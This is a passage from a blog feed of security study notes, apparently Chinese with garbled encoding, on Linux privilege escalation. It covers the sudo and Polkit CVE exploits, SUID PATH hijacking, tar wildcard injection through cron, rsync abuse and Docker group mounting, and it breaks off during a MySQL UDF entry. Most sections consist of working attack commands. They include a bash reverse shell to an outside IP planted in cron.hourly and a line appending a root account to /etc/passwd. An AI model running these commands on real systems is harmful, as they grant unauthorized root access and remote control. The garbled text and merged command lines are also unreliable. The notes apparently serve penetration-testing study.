alt="å¾®ä¿¡æˆªå›¾_20230515141911"></p><h4 id="SUDO-CVE-2021-3156"><a href="#SUDO-CVE-2021-3156" class="headerlink" title="SUDO(CVE-2021-3156)"></a>SUDO(CVE-2021-3156)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">sudo -V<br>sudo: <span class="hljs-number">1.8</span>.<span class="hljs-number">2</span> - <span class="hljs-number">1.8</span>.<span class="hljs-number">31</span>p2<br>sudo: <span class="hljs-number">1.9</span>.<span class="hljs-number">0</span> - <span class="hljs-number">1.9</span>.<span class="hljs-number">5</span>p1<br>-åˆ¤æ–­: sudoedit -s / æŠ¥é”™å­˜åœ¨ã€‚åˆ™æ¼æ´å­˜åœ¨-åˆ©ç”¨:<br>git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/blasty/CVE-2021-3156.gitcd CVE-2021-3156</span><br>make<br>chmod a+x sudo-hax-me-a-sandwich./sudo-hax-me-a-sandwich <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="Polkit-CVE-2021-4034"><a href="#Polkit-CVE-2021-4034" class="headerlink" title="Polkit(CVE-2021-4034)"></a>Polkit(CVE-2021-4034)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">æ¼æ´å½±å“<span class="hljs-number">2009</span>å¹´<span class="hljs-number">5</span>æœˆè‡³ä»Šçš„æ‰€æœ‰polkitç‰ˆæœ¬<br>ç”±äºpolkitæ˜¯ç³»ç»Ÿé¢„è£…å·¥å…·ï¼Œæ‰€æœ‰å­˜åœ¨polkitçš„<span class="hljs-number">1</span>inuxç³»ç»Ÿå‡å—å½±å“å¦‚: Centosã€Ubuntuã€Debianã€Redhatã€Fedoraã€Gentooã€Mageiaç­‰-åˆ¤æ–­: dpkg -<span class="hljs-number">1</span> policykit-<span class="hljs-number">1</span>-åˆ©ç”¨:<br>git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/berdav/CVE-2021-4034.gitcd CVE-2021-4034/</span><br>make<br>./cve-<span class="hljs-number">2021</span>-<span class="hljs-number">4034</span><br></code></pre></td></tr></table></figure><h3 id="ç¯å¢ƒå˜é‡"><a href="#ç¯å¢ƒå˜é‡" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h3><h5 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ROOTç”¨æˆ·å¯¹æŸä¸ªç¬¬ä¸‰æ–¹ç¨‹åºç»™äºˆäº†SUIDæƒé™<br></code></pre></td></tr></table></figure><h5 id="æ¢æµ‹-1"><a href="#æ¢æµ‹-1" class="headerlink" title="æ¢æµ‹"></a>æ¢æµ‹</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æ¢é’ˆ: <span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h5 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">é¦–å…ˆrootç”¨æˆ·æ“ä½œ:<br>rootç”¨æˆ·è®²å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼Œ<br>ä¿è¯æ–‡ä»¶çš„æ­£å¸¸æˆæƒè¿è¡Œï¼Œç»™äºˆROOTæƒé™æ‰§è¡Œ<br>gcc demo.c -o shell<br>chmod u+s shell<br>å…¶æ¬¡æ™®é€šç”¨æˆ·æ“ä½œ:<br>æ™®é€šç”¨æˆ·é€šè¿‡å¯¹æ–‡ä»¶åç¼–è¯‘æˆ–æºä»£ç æŸ¥çœ‹ï¼Œè¦†ç›–å…¶æ‰§è¡Œç¯å¢ƒå˜é‡ï¼Œç›´æ¥è®©å…¶æ‰§è¡ŒæŒ‡å®šç¨‹åºè·å–æƒé™<br>  cp /bin/bash /tmp/ps<br>  export PATH=/tmp:<span class="hljs-variable">$PATH</span><br>  ./shell<br>  id<br>è¿‡ç¨‹åˆ†æ:<br><span class="hljs-number">1</span>.å…ˆè·å–suidç¨‹åº<br><span class="hljs-number">2</span>.å»é™¤ç³»ç»Ÿè‡ªå¸¦çš„<br><span class="hljs-number">3</span>.ä¸‹è½½è¿™ä¸ªç¨‹åºè¿›è¡Œåç¼–è¯‘<br></code></pre></td></tr></table></figure><p><img src="/image/1-16841344324143.png" alt="1"></p><p><img src="/image/2-16841344324144.png" alt="2"></p><p><img src="/image/3.png" alt="3"></p><p><img src="/image/4-16841344324122.png" alt="4"></p><h3 id="å®šæ—¶ä»»åŠ¡ææƒ"><a href="#å®šæ—¶ä»»åŠ¡ææƒ" class="headerlink" title="å®šæ—¶ä»»åŠ¡ææƒ"></a>å®šæ—¶ä»»åŠ¡ææƒ</h3><p>å®šæ—¶ä»»åŠ¡&amp;tar&amp;suid<br>&#x2F;etc&#x2F;crontab</p><h5 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">åˆ©ç”¨å®šæ—¶ä»»åŠ¡é…ç½®ä¸è§„èŒƒå¯¼è‡´çš„å®‰å…¨é£é™©<br>ä¾‹å¦‚ æ‰§è¡Œçš„è„šæœ¬(xx.<span class="hljs-keyword">sh</span>) å¦‚ä¸‹<br><span class="hljs-keyword">cd</span> /tmp;tar zxf bckup.tar .gz*<br>åœ¨æ–‡ä»¶åâ€œbckup.tar.gz*â€çš„æœ«å°¾çš„æ˜Ÿå· (*) æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼ŒåŒ¹é…å½“å‰ç›®å½•ä¸­ä»¥â€œbckup,tar.gzâ€å¼€å¤´å¹¶åœ¨å…¶åæœ‰å…¶ä»–å­—ç¬¦çš„ä»»ä½•æ–‡ä»¶ã€‚å½“ä¸€ä¸ªå½’æ¡£æ–‡ä»¶è¢«åˆ†æˆå¤šä¸ªæ–‡ä»¶ä»¥ä¾¿äºä¼ è¾“æˆ–å­˜å‚¨æ—¶ï¼Œè¿™éå¸¸æœ‰ç”¨ã€‚è¿™æ ·å½“æ–‡ä»¶å¤¹ä¸‹é¢æœ‰åˆ—å…¥â€œ--checkpoint-action=exec=<span class="hljs-keyword">sh</span> <span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span>â€çš„æ–‡ä»¶æ—¶ã€‚å°±ä¼šæœ‰å¦‚ä¸‹æ•ˆæœ-&gt;tar zxf bckup.tar.gz --checkpoint-action=exec=<span class="hljs-keyword">sh</span> <span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span>--&gt;tar zxf bckup ,tar.gz --checkpoint=1<br></code></pre></td></tr></table></figure><h5 id="æ¡ä»¶-1"><a href="#æ¡ä»¶-1" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ææƒé€šè¿‡è·å–è®¡åˆ’ä»»åŠ¡æ‰§è¡Œæ–‡ä»¶ä¿¡æ¯è¿›è¡Œææƒ</span><br><span class="hljs-number">1</span>ã€ç›¸å¯¹è·¯å¾„å’Œç»å¯¹è·¯å¾„æ‰§è¡Œ<br><span class="hljs-number">2</span>ã€è®¡åˆ’ä»»åŠ¡å‘½ä»¤å­˜åœ¨å‚æ•°è°ƒç”¨<br></code></pre></td></tr></table></figure><h6 id="å¤ç°æ¡ä»¶"><a href="#å¤ç°æ¡ä»¶" class="headerlink" title="å¤ç°æ¡ä»¶"></a>å¤ç°æ¡ä»¶</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.ä¸Šä¼ ç¯å¢ƒå¤ç°å®šæ—¶è„šæœ¬:bak.sh<br>cd /tmp;tar lzxf bckup.tar .gz<br>cd /tmp;tar czf /tmp/backup.tar.gz *<br>  (æ³¨æ„ä¸Šä¼ åè¦èµ‹æƒ chmod +x bak.sh)<br><span class="hljs-number">2</span>.é…ç½®å®šæ—¶ä»»åŠ¡:<br>    */<span class="hljs-number">1</span> * * * * root /tmp/bak.sh<br><span class="hljs-number">3</span>.å¼€å¯å®šæ—¶ä»»åŠ¡:<br>   /sbin/service crond start<br>crontab -u root -l<br>---å®šæ—¶ç›¸å…³å…¶ä»–å‘½ä»¤---/sbin/service crond stop <span class="hljs-comment">//å…³é—­æœåŠ¡</span><br>/sbin/service crond restart <span class="hljs-comment">//é‡å¯æœåŠ¡</span><br>/sbin/service crond reload <span class="hljs-comment">//é‡æ–°è½½å…¥é…ç½®</span><br>/sbin/service crond status <span class="hljs-comment">//å¯åŠ¨æœåŠ¡</span><br></code></pre></td></tr></table></figure><h5 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">åœ¨ç›¸å…³å‘½ä»¤ä¸‹æ‰§è¡Œç›®å½•ã€‚åˆ©ç”¨è®¡åˆ’ä»»åŠ¡çš„å¤‡ä»½åŠŸèƒ½tarå‘½ä»¤çš„å‚æ•°åˆ©ç”¨<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh test.sh&quot;</span>  <span class="hljs-comment">#ä»¥å‘½ä»¤å‚æ•°å‘½åçš„æ–‡ä»¶</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span> &gt; --checkpoint=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; test.sh<br>chmod +x test.sh<br>==ã€‹ç­‰å¾…å®šæ—¶ä»»åŠ¡è¢«æ‰§è¡Œ<br>è¿è¡Œ ./bash -<span class="hljs-title function_ invoke__">p</span>(åˆ°è¿™ç›¸å½“äºç”¨SUIDææƒ)<br></code></pre></td></tr></table></figure><h3 id="å®šæ—¶ä»»åŠ¡-æ–‡ä»¶æƒé™"><a href="#å®šæ—¶ä»»åŠ¡-æ–‡ä»¶æƒé™" class="headerlink" title="å®šæ—¶ä»»åŠ¡&amp;æ–‡ä»¶æƒé™"></a>å®šæ—¶ä»»åŠ¡&amp;æ–‡ä»¶æƒé™</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">åŒæ ·ä»¥ä¸Šé¢è¿™ä¸ªå®šæ—¶ä»»åŠ¡ä¸ºä¾‹å­å‡å¦‚ï¼Œrootç”¨æˆ·ç»™è¿™ä¸ªè„šæœ¬èµ‹æƒçš„æ—¶å€™ ç”¨çš„<span class="hljs-number">777</span> æˆ–è€… <span class="hljs-number">775</span> èµ‹æƒ<br>é‚£ä¹ˆæˆ‘ä»¬ä½é…ç”¨æˆ·ã€‚å°±æœ‰ä¿®æ”¹è¿™ä¸ªè„šæœ¬çš„æƒé™<br><br><span class="hljs-comment">// å¯ä¿®æ”¹ä¸ºåå¼¹å‘½ä»¤</span><br></code></pre></td></tr></table></figure><p><img src="/image/image-20230505170751181.png" alt="image-20230505170751181"></p><h3 id="Rsync-æœªæˆæƒè®¿é—®ææƒ"><a href="#Rsync-æœªæˆæƒè®¿é—®ææƒ" class="headerlink" title="Rsync(æœªæˆæƒè®¿é—®ææƒ)"></a>Rsync(æœªæˆæƒè®¿é—®ææƒ)</h3><h5 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">Rsyncæ˜¯linuxä¸‹ä¸€æ¬¾æ•°æ®å¤‡ä»½å·¥å…·ï¼Œé»˜è®¤å¼€å¯<span class="hljs-number">873</span>ç«¯å£å€ŸåŠ©Linuxé»˜è®¤è®¡åˆ’ä»»åŠ¡è°ƒç”¨/etc/cron.hourlyï¼Œåˆ©ç”¨rsyncè¿æ¥è¦†ç›–<br>ç¯å¢ƒæ­å»º<span class="hljs-number">1</span>:<br>https:<span class="hljs-comment">//vulhub.org/#/environments/rsync/common/</span><br><span class="hljs-comment">#å¯é€‰</span><br>docker-compose build<br>docker-compose upload<br>ç¯å¢ƒæ­å»º<span class="hljs-number">2</span>:<br>æˆ–è€…åœ¨çº¿é¶åœº:<br>https:<span class="hljs-comment">//vulfocus.cn/#/dashboard</span><br>ç¯å¢ƒæ­å»º<span class="hljs-number">3</span>:<br>yum -y install rsync <br>vim /etc/rsyncd.conf é…ç½®ä¸€ä¸‹ ï¼ˆé…ç½®æ–‡ä»¶åœ¨ç¯å¢ƒæ­å»ºæ–‡ä»¶å¤¹é‡Œé¢ï¼‰<br>rsync --daemon<br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230516102123.png" alt="å¾®ä¿¡æˆªå›¾_20230516102123"></p><h5 id="ææƒè¿‡ç¨‹"><a href="#ææƒè¿‡ç¨‹" class="headerlink" title="ææƒè¿‡ç¨‹"></a>ææƒè¿‡ç¨‹</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">rsync rsync:<span class="hljs-comment">//ip:873</span><br>rsync rsync:<span class="hljs-comment">//192.168.156.135:873/src</span><br><span class="hljs-number">123</span> <span class="hljs-number">.58</span>.<span class="hljs-number">224.8</span>:<span class="hljs-number">55295</span><br>-ææƒè¿‡ç¨‹:<br><span class="hljs-number">1</span>ã€åˆ›å»ºä¸€ä¸ªncæ–‡ä»¶ï¼Œå†…å®¹<br><span class="hljs-comment">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">43.138</span>.<span class="hljs-number">215.2</span>/<span class="hljs-number">3333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-number">2</span>ã€èµ‹äºˆæ‰§è¡Œæƒé™:<br>chmod +x nc<br><span class="hljs-number">3</span>ã€ä¸Šä¼ æ–‡ä»¶è¦†ç›–å®šæ—¶ä»»åŠ¡ç›®å½•ä¸‹<br>rsync -av nc rsync:<span class="hljs-comment">//192.168.156.135:873/src/etc/cron.hourly/</span><br><span class="hljs-number">4</span>ã€ä¸‹è½½æ–‡ä»¶<br>rsync -av rsync:<span class="hljs-comment">//192.168.156.135:873/src/etc/crontab ./</span><br>rsync -av rsync:<span class="hljs-comment">//192.168.156.135:873/src/etc/passwd ./</span><br><span class="hljs-number">5</span>ã€è¿›è¡Œnc ç›‘å¬ç›¸åº”çš„ç«¯å£<br>nc -lvp <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure><p><img src="/image/QQ%E6%88%AA%E5%9B%BE20230516115704.jpg" alt="QQæˆªå›¾20230516115704"></p><h3 id="Dockerç»„æŒ‚è½½"><a href="#Dockerç»„æŒ‚è½½" class="headerlink" title="Dockerç»„æŒ‚è½½"></a>Dockerç»„æŒ‚è½½</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// root --&gt; docker --&gt;images</span><br><span class="hljs-comment">// boy --&gt; docker</span><br></code></pre></td></tr></table></figure><h5 id="å¤ç°ç¯å¢ƒ"><a href="#å¤ç°ç¯å¢ƒ" class="headerlink" title="å¤ç°ç¯å¢ƒ"></a>å¤ç°ç¯å¢ƒ</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">æ™®é€šç”¨æˆ·åœ¨dockerç»„ï¼Œåˆ©ç”¨dockeræœåŠ¡å¯åŠ¨é•œåƒæŒ‚è½½ç›®å½•<br>ä»è€Œæ¥è®¿é—®rootç›®å½•ã€etcç›®å½•ç­‰æ•æ„Ÿæ–‡ä»¶æ¥è¿›è¡Œæƒé™æå‡ã€‚<br>-å¤ç°: åˆ›å»ºç”¨æˆ·å½’ç±»ç›®å½•ï¼Œæ·»åŠ åˆ°dockerç»„<br>useradd test<br>passwd test<br>ç”¨rootç”¨æˆ·å»æ”¹testç”¨æˆ·çš„æ‰€å±ç»„ï¼Œä½¿testç”¨æˆ·è¿›å…¥åˆ°dockerç»„é‡Œ<br>usermod -G docker test<span class="hljs-comment">#æ·»åŠ testç”¨æˆ·åˆ°dockerç»„</span><br>newgrp docker <span class="hljs-comment">#æ›´æ–°dockerç»„</span><br></code></pre></td></tr></table></figure><h5 id="åˆ©ç”¨-2"><a href="#åˆ©ç”¨-2" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">æ‹‰å–alpineé•œåƒ<br>$ docker pull hub-mirror.c.<span class="hljs-number">163</span>.com/library/alpine<br>$ docker pull registry.cn-hangzhou.aliyuncs.com/library/alpine<br>å¯åŠ¨alpineé•œåƒ<br>docker run -v /root:/mnt -it alpine<br>ä¸»è¦çš„ä½œç”¨æ˜¯: ä»Dockerä¸Šé¢ä¸‹è½½alpineé•œåƒï¼Œç„¶åè¿è¡Œ;<br>-vå°†å®¹å™¨å¤–éƒ¨çš„ç›®å½•/rootæŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨/mntï¼Œä½¿ç”¨-itå‚æ•°è¿›å…¥å®¹å™¨shellã€‚<br>docker run -v /etc:/mnt -it alpine<br>cd /mnt<br>id  <span class="hljs-comment">#æå‡åˆ°äº†rootæƒé™</span><br>ls  <span class="hljs-comment">#å¯çœ‹è§/etcä¸­çš„å†…å®¹ã€‚å¹¶ä¸”å¯ä»¥ä¿®æ”¹</span><br>-------------------<br>å¸¸è§é—®é¢˜<br>-------------------<br>alpine é•œåƒæ˜¯ä»€ä¹ˆ?<br>alpine é•œåƒé€šå¸¸è¢«ç”¨ä½œè½»é‡çº§çš„åŸºç¡€é•œåƒï¼Œç”¨äºæ„å»ºå®¹å™¨åŒ–åº”ç”¨ã€‚ç”±äºå…¶ä½“ç§¯å°,å¯ä»¥å¿«é€Ÿåœ°ä¸‹è½½å’Œéƒ¨ç½²æ•ˆåœ°å‡å°é•œåƒçš„å¤§å°ï¼Œå‡å°‘é•œåƒæ„å»ºå’Œéƒ¨ç½²çš„æ—¶é—´ã€‚<br>åŒæ—¶ä¹Ÿèƒ½æœ‰<br>etc ç›®å½•ä¸‹ï¼Œshadowä¸passwdåŒºåˆ«?<br>  /etc/shadow æ–‡ä»¶åŒ…å«äº†æ‰€æœ‰ç³»ç»Ÿç”¨æˆ·çš„å¯†ç æ•£åˆ—å€¼ä»¥åŠå…¶ä»–ä¸å¯†ç ç›¸å…³çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å¯†ç æœ€åä¸€æ¬¡ä¿®æ”¹çš„æ—¶é—´ã€å¯†ç è¿‡æœŸæ—¶é—´ã€è´¦æˆ·æ˜¯å¦è¢«é”å®šç­‰ç­‰ã€‚è¿™ä¸ªæ–‡ä»¶çš„æ¯ä¸€è¡Œéƒ½å¯¹åº”ä¸€ä¸ªç”¨æˆ·ã€‚<br>passwdä¸­å¯†ç éƒ¨åˆ†ä¸ºxçš„åŸå› ?<br>åœ¨/etc/passwdæ–‡ä»¶ä¸­ï¼Œå¯†ç å­—æ®µçš„é€šå¸¸è¢«è®¾ç½®ä¸ºâ€œxâ€æˆ–â€œ*â€å­—ç¬¦ï¼Œè¿™æ„å‘³ç€å¯†ç å­˜å‚¨åœ¨/etc/shadowæ–‡ä»¶ä¸­ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†ä¿æŠ¤å¯†ç ä¿¡æ¯çš„å®‰å…¨æ€§ï¼Œé¿å…è®©æœªç»æˆæƒçš„ç”¨æˆ·é€šè¿‡æŸ¥çœ‹/etc/passwdæ–‡ä»¶æ¥è·å¾—å¯†ç ä¿¡æ¯ã€‚åªæœ‰ç³»ç»Ÿç®¡ç†å‘˜å’Œç‰¹å®šçš„ç”¨æˆ·æ‰æœ‰æƒé™æŸ¥çœ‹/etc/shadowæ–‡ä»¶ï¼Œå› ä¸ºå®ƒåŒ…å«äº†ç»è¿‡å“ˆå¸Œå¤„ç†çš„å¯†ç ä¿¡æ¯ã€‚<br></code></pre></td></tr></table></figure><h5 id="æ·±å…¥åˆ©ç”¨"><a href="#æ·±å…¥åˆ©ç”¨" class="headerlink" title="æ·±å…¥åˆ©ç”¨"></a>æ·±å…¥åˆ©ç”¨</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">openssl passwd -<span class="hljs-number">1</span> -salt raj<br>è·å–åˆ°å¯†ç : $<span class="hljs-number">1</span>SrajscgoI1m5chsDvPuQrsxOuuO<br><span class="hljs-comment">// åœ¨/etc/passwdæ–‡ä»¶åé¢æ·»åŠ ç›¸åº”å†…å®¹ï¼Œå®ç°é€šè¿‡passwdæ·»åŠ ç‰¹æƒè´¦å·</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;raj:&lt;ä¸Šé¢è·å–åˆ°çš„å¯†é’¥&gt;:0:0::/root:/bin/bash&#x27;</span> &gt;&gt;passwd<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysqlæ•°æ®åº“ææƒ</title>
    <link href="/2023/02/14/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
    <url>/2023/02/14/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h2 id="æƒé™æå‡-æ•°æ®åº“"><a href="#æƒé™æå‡-æ•°æ®åº“" class="headerlink" title="æƒé™æå‡-æ•°æ®åº“"></a>æƒé™æå‡-æ•°æ®åº“</h2><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><h5 id="ææƒæ¡ä»¶"><a href="#ææƒæ¡ä»¶" class="headerlink" title="ææƒæ¡ä»¶"></a>ææƒæ¡ä»¶</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// æ•°æ®åº“çš„æœ€é«˜æƒé™ç”¨æˆ·çš„å¯†ç </span><br>-secure-fle-privæ²¡è¿›è¡Œç›®å½•é™åˆ¶<br>SHOW VARIABLES LIKE <span class="hljs-string">&quot;secure fle priv&quot;</span>;<br><span class="hljs-number">0</span>ã€ç½‘ç«™å­˜åœ¨é«˜æƒé™SOLæ³¨å…¥ç‚¹<br><span class="hljs-number">1</span>ã€æ•°æ®åº“çš„å­˜å‚¨æ–‡ä»¶æˆ–å¤‡ä»½æ–‡ä»¶<br><span class="hljs-number">2</span>ã€ç½‘ç«™åº”ç”¨æºç ä¸­çš„æ•°æ®åº“é…ç½®æ–‡ä»¶<br><span class="hljs-number">3</span>ã€é‡‡ç”¨å·¥å…·æˆ–è„šæœ¬çˆ†ç ´(éœ€è§£å†³å¤–è”é—®é¢˜)<br></code></pre></td></tr></table></figure><h5 id="è´¦å·å¯†ç è·å–"><a href="#è´¦å·å¯†ç è·å–" class="headerlink" title="è´¦å·å¯†ç è·å–"></a>è´¦å·å¯†ç è·å–</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>ã€é€šè¿‡æ³¨å…¥ç‚¹<br>sqlmap.py-D mysql -T user -C <span class="hljs-string">&quot;password&quot;</span><br></code></pre></td></tr></table></figure><h6 id="1-é€šè¿‡æ³¨å…¥ç‚¹"><a href="#1-é€šè¿‡æ³¨å…¥ç‚¹" class="headerlink" title="1.é€šè¿‡æ³¨å…¥ç‚¹"></a>1.é€šè¿‡æ³¨å…¥ç‚¹</h6><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">```<br><br>###### <span class="hljs-number">2.</span>é€šè¿‡æ–‡ä»¶<br><br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>###### <span class="hljs-number">3.</span>ç½‘ç«™é…ç½®æ–‡ä»¶<br><br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### MYSQL-UDFææƒ<br><br>```php<br>UDF (Userdefined function)å¯ç¿»è¯‘ä¸ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œ<br>å…¶ä¸ºmysqlçš„ä¸€ä¸ªæ‹“å±•æ¥å£ï¼Œ<br>å¯ä»¥ä¸ºmysqlå¢æ·»ä¸€äº›å‡½æ•°ã€‚<br>æ¯”å¦‚mysqlä¸€äº›å‡½æ•°æ²¡æœ‰ï¼Œæˆ‘å°±ä½¿ç”¨UDFåŠ å…¥ä¸€äº›å‡½æ•°è¿›å»ï¼Œé‚£ä¹ˆæˆ‘å°±å¯ä»¥åœ¨mysqlä¸­ä½¿ç”¨è¿™ä¸ªå‡½æ•°äº†ã€‚<br></code></pre></td></tr></table></figure><h5 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">æ•°æ®åº“çš„æœ€é«˜æƒé™ç”¨æˆ·çš„å¯†ç <br>secure-file-privæ²¡è¿›è¡Œç›®å½•é™åˆ¶  <span 